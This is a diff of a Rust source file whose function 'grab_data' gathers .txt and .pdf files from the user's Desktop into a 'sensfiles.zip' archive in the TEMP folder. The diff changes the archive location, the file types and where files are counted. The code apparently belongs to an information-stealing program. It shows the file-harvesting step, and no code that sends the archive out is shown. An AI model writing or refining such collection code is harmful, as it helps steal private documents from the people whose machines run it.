@@ -3,7 +3,7 @@ use std::io::*;
 use zip::write::*;
 
 pub fn grab_data() -> Option<String> {
-    let filename = format!("{}/sensfiles.zip", &std::env::var("LOCALAPPDATA").unwrap());
+    let filename = format!("{}\\sensfiles.zip", &std::env::var("TEMP").unwrap());
     let path = std::path::Path::new(&filename);
 
     if let Ok(file) = std::fs::File::create(&path) {
@@ -11,7 +11,7 @@ pub fn grab_data() -> Option<String> {
         let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
 
         let glob_string = format!(
-            r"{}/Desktop/*.{{xls,txt,pdf}}",
+            r"{}/Desktop/*.{{txt,pdf}}",
             &std::env::var("USERPROFILE").unwrap()
         );
 
@@ -23,18 +23,18 @@ pub fn grab_data() -> Option<String> {
                 let path = dent.path();
                 if path.is_file() {
                     if let Ok(f) = &mut File::open(path) {
-                        unsafe {
-                            crate::FILES += 1;
-                        }
-
+                        
                         let mut buffer: Vec<u8> = match &f.metadata() {
                             Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                             Err(_) => Vec::new(),
                         };
-
+                        
                         if buffer.capacity() >= 2097152 {
                             println!("{} is too large to be included in the archive", path.display());
                             return;
+                        }
+                        unsafe {
+                            crate::FILES += 1;
                         }
 
 
